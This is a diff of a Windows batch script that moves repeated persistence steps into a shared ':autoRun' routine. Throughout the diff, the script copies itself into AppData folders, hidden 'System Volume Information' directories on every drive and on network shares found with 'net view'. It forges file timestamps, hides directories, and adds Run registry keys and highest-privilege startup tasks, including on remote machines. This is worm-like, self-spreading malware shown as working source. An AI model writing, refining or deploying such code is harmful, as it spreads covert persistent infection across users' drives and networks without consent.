@@ -89,13 +89,8 @@ if not exist "%path_autoRun2%\%~nx0" (
 
 for %%i in (localAppData appData) do (
   if not exist "!%%i!\%~nx0" call copy /y "%~dpnx0" "!%%i!\"
-  (
-    call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
-    call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
-    call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
-    call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
-    call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
-  )>nul 2>nul
+  call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
+  %autoRun% add %%i "!%%i!\%~nx0"
 )
 
 
@@ -107,13 +102,8 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
     if /i "%%j" == "System Volume Information" (
       if not exist "%%i:\%%j\%~nx0" copy /y "%~dpnx0" "%%i:\%%j\"
       attrib +h +s "%%i:\%%j"
-      (
-        %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
-        reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-        reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-        schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
-      )>nul 2>nul
+      %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
+      %autoRun% add %%i "%%i:\%%j\%~nx0"
     )
 
     if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
@@ -149,13 +139,8 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
       if /i "%%j" == "System Volume Information" (
         if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~dpnx0" "%%h\%%i\%%j\"
         attrib +h +s "%%h\%%i\%%j"
-        (
-          %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
-          reg add %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-          reg add %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-          reg add %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-          for /f "delims=\" %%z in ("%%h") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
-        )>nul 2>nul
+        %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
+        %autoRun% add %%i "%%i:\%%j\%~nx0" %%h
       )
   
       if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
@@ -201,13 +186,8 @@ if exist "%path_autoRun2%\%~nx0" del /q "%path_autoRun2%\%~nx0"
 
 
 for %%i in (localAppData appData) do (
-  (
-    call del /q "!%%i!\%~nx0"
-    call reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-    call reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-    call reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-    call schtasks /delete /tn "%app_name% %%i" /f
-  )>nul 2>nul
+  call del /q "!%%i!\%~nx0"
+  %autoRun% delete %%i
 )
 
 
@@ -217,13 +197,8 @@ for %%i in (localAppData appData) do (
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
     if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
-      (
-        del /q "%%i:\%%j\%~nx0"
-        reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-        reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-        reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-        schtasks /delete /tn "%app_name% %%i" /f
-      )>nul 2>nul
+      del /q "%%i:\%%j\%~nx0"
+      %autoRun% delete %%i
     )
 
     if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
@@ -237,17 +212,12 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 
 
 
-for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
-  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
+for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
       if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
-        (
-          del /q "%%h\%%i\%%j\%~nx0"
-          reg delete %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-          reg delete %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-          reg delete %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-          for /f "delims=\" %%z in ("%%h") do schtasks /delete /s %%z /tn "%app_name% %%i" /f
-        )>nul 2>nul
+        del /q "%%h\%%i\%%j\%~nx0"
+        %autoRun% delete %%i %%h
       )
 
       if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
@@ -280,17 +250,25 @@ exit
 
 
 :autoRun
-if "%1" == "add" (
-  reg %1 %4HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d %3 /f
-  reg %1 %4HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d %3 /f
-  reg %1 %4HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /d %3 /f
-  if "%4" == "" ( schtasks /create /sc onstart /tn "%app_name% %2" /tr %3 /f /rl highest
-  ) else for /f "delims=\" %%z in ("%4") do schtasks /create /s %%z /sc onstart /tn "%app_name% %2" /tr %3 /f /rl highest
+set option1=%1
+set option2=%2
+set option3=%3
+set option4=%4
+
+set "option3=!option3:"=!"
+if "%option4%" NEQ "" set "option4=!option4:"=!"
+
+if "%option1%" == "add" (
+  reg add %option4%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
+  reg add %option4%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
+  reg add %option4%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /d "%option3%" /f
+  if "%option4%" == "" ( schtasks /create /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
+  ) else for /f "delims=\" %%z in ("%option4%") do schtasks /create /s %%z /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
 ) else (
-  reg %1 %3HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
-  reg %1 %3HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
-  reg %1 %3HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /f
-  if "%3" == "" ( schtasks /delete /tn "%app_name% %2" /f
-  ) else for /f "delims=\" %%z in ("%3") do schtasks /delete /s %%z /tn "%app_name% %2" /f
+  reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
+  reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
+  reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /f
+  if "%option3%" == "" ( schtasks /delete /tn "%app_name% %option2%" /f
+  ) else for /f "delims=\" %%z in ("%option3%") do schtasks /delete /s %%z /tn "%app_name% %option2%" /f
 )
 exit /b
